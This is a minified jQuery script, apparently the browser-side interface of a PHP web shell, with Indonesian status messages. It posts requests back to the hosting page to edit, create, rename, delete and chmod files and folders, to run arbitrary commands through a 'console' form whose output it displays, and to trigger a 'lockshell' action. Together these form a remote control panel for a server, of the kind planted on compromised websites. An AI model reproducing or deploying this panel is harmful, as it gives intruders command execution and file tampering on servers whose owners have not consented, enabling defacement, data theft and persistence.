$(document).ready((function(){$((function(){$('[data-toggle="tooltip"]').tooltip()})),$("#optionSelect").click((function(){var e=$("#optval").find(":selected").val(),o=1==e?"Delete?":"Zipping?";console.log(e);var i=[];$(".select:checked").each((function(){i.push($(this).val())})),Swal.fire({title:o,icon:"warning",showCancelButton:!0,confirmButtonColor:"#3085d6",cancelButtonColor:"#d33",confirmButtonText:"Yes!",reverseButtons:!0}).then((e=>{e.isConfirmed&&$.post(window.location.href,{action:"massremove",filename:i},(function(e,o){e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Gagal!","error")}))}))})),$('[data-nfm="file_action"]').click((function(){$(".modal").modal("hide");var e=$(this).attr("data-name");$("#selectedFile").val(e),$.post(window.location.href,{action:"editfile",filename:e},(function(o,i){$("#edit_filename").text(e),$("#edit_fileread").val(o)})),$("#editFile").modal({show:!0})})),$('[name="action_edit"]').click((function(){var e=$("#selectedFile").val();$(".modal").modal("hide"),$.post(window.location.href,{action:"editfile",filename:e},(function(o,i){$("#edit_filename").text(e),$("#edit_fileread").val(o)})),$("#editFile").modal({show:!0})})),$('[name="action_rename"]').click((function(){var e=$("#selectedFile").val();$("#rename_old").text(e),$(".modal").modal("hide"),$("#renameFile").modal({show:!0})})),$("#createfile").on("submit",(function(e){e.preventDefault();var o=$("#create_filename").val();$("#createfile_name").text(o),$("#createsfile").modal({show:!0})})),$("#console").on("submit",(function(e){e.preventDefault();var o=$("#con_cmd").val();$.post(window.location.href,{action:"console",filename:o},(function(e,o){$("#outputcmds").val(e),$("#console_output").modal({show:!0})}))})),$("#consoles").on("submit",(function(e){e.preventDefault();var o=$("#con_cmds").val();$.post(window.location.href,{action:"console",filename:o},(function(e,o){$("#outputcmds").val(e),$("#console_output").modal({show:!0})}))})),$("#editfile_gas").on("click",(function(e){e.preventDefault();var o=$("#edit_filename").text(),i=$("#edit_fileread").val();$.post(window.location.href,{action:"updatefile",filename:o,isi:i},(function(e,o){e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Gagal!","error")}))})),$("#renamefile_gas").on("click",(function(e){e.preventDefault();var o=$("#rename_old").text(),i=$("#rename_new").val();$.post(window.location.href,{action:"renamefile",filename:o,baru:i},(function(e,o){e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Gagal!","error")}))})),$("#renamefolder_gas").on("click",(function(e){e.preventDefault();var o=$("#folder_old").text(),i=$("#folder_new").val();$.post(window.location.href,{action:"renamefolder",filename:o,baru:i},(function(e,o){e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Gagal!","error")}))})),$("#createfile_gas").on("click",(function(e){e.preventDefault();var o=$("#createfile_name").text(),i=$("#createfile_isi").val();$.post(window.location.href,{action:"createfile",filename:o,isi:i},(function(e,o){e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Gagal!","error")}))})),$("#createdir").on("submit",(function(e){e.preventDefault();var o=$("#dirname").val();$.post(window.location.href,{action:"createdir",filename:o},(function(e,o){e?(Swal.fire("Sukses!","Folder berhasil dibuat.","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Folder gagal dibuat.","error")}))})),$('[name="action_delete"]').click((function(){var e=$("#selectedFile").val();Swal.fire({title:"Delete?",text:"filename: "+e,icon:"warning",showCancelButton:!0,confirmButtonColor:"#3085d6",cancelButtonColor:"#d33",confirmButtonText:"Yes!",reverseButtons:!0}).then((o=>{o.isConfirmed&&$.post(window.location.href,{action:"removefile",filename:e},(function(e,o){e?(Swal.fire("Sukses!","File berhasil dihapus.","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","File gagal dihapus.","error")}))}))})),$(".rename").click((function(e){e.preventDefault(),$.post(window.location.href,{action:"renameFile",filename:filename},(function(e,o){e?(Swal.fire("Sukses!","File berhasil dirubah.","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","File gagal dirubah.","error")}))})),$(".lockshell").click((function(){$.post(window.location.href,{action:"lock",filename:!0},(function(e,o){console.log(e)}))})),$(".gaschmodfile").click((function(){var e=$("#selectedFile").val(),o=$(".chmodval").val();$.post(window.location.href,{action:"chmod",filename:e,chmod:o},(function(e,o){"1"===e?(Swal.fire("Sukses!","Berhasil!","success"),setTimeout((function(){window.location.reload()}),500)):(Swal.fire("Gagal!","Gagal!","success"),setTimeout((function(){window.location.reload()}),500))}))})),$(".delete").click((function(){var e=$(this).attr("data-name"),o=$(this).attr("data-type");Swal.fire({title:"Delete?",text:"Name: "+e,icon:"warning",showCancelButton:!0,confirmButtonColor:"#3085d6",cancelButtonColor:"#d33",confirmButtonText:"Yes!",reverseButtons:!0}).then((i=>{i.isConfirmed&&("file"==o?$.post(window.location.href,{action:"removefile",filename:e},(function(e,o){e?(Swal.fire("Sukses!","File berhasil dihapus.","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","File gagal dihapus.","error")})):$.post(window.location.href,{action:"removedir",filename:e},(function(e,o){e?(Swal.fire("Sukses!","Folder berhasil dihapus.","success"),setTimeout((function(){window.location.reload()}),500)):Swal.fire("Gagal!","Folder gagal dihapus.","error")})))}))})),$('[name="action_chmod"]').click((function(){$("#selectedFile").val();$(".modal").modal("hide"),$("#chmodFile").modal({show:!0})})),$(".renamefolder").click((function(){var e=$(".renamefolder").attr("data-name");$(".modal").modal("hide"),$("#renamefolder").modal({show:!0}),$("#folder_old").text(e)})),$("[name='selectAll']").click((function(){var e=$(".select");e.prop("checked",!e.prop("checked"))}))}));
